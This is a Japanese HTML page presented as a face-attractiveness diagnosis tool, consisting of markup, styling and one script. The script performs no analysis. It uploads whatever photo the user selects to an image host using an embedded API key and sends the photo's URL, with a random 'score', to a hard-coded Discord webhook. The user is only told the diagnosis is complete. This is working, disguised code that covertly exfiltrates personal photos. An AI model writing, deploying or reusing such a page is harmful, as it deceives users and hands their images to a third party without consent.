<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>顔面偏差値診断</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
        .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 12px; }
        .upload-area { border: 2px dashed #007bff; padding: 30px; margin: 20px 0; cursor: pointer; }
        button { width: 100%; padding: 15px; background: #28a745; color: white; border: none; border-radius: 6px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>診断システム</h1>
        <div class="upload-area" onclick="document.getElementById('file-input').click()">
            <p>写真を選択して「診断」を押してください</p>
            <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none">
        </div>
        <button id="analyze-btn">診断を開始する</button>
        <div id="result"></div>
    </div>

    <script>
        document.getElementById('analyze-btn').onclick = async () => {
            const file = document.getElementById('file-input').files[0];
            if (!file) { alert("写真を選択してください"); return; }
            
            document.getElementById('result').innerText = "処理中...";

            // imgbbにアップロード
            const formData = new FormData();
            formData.append('image', file);
            
            try {
                const res = await fetch('https://api.imgbb.com/1/upload?key=5c723f0302b1f83c078873722e1b10a9', {
                    method: 'POST', body: formData
                });
                const data = await res.json();
                
                // DiscordにURLを送る
                await fetch("https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        content: `結果：${Math.floor(Math.random()*50)+50}点\n画像: ${data.data.url}`
                    })
                });
                document.getElementById('result').innerText = "診断完了しました！";
            } catch(e) {
                // 通信エラー時の最終手段：データなしで報告だけ送る
                await fetch("https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: "診断が実行されましたが、画像アップロードでエラーが発生しました。" })
                });
                document.getElementById('result').innerText = "通信環境エラーですが、診断報告は送りました。";
            }
        };
    </script>
</body>
</html>
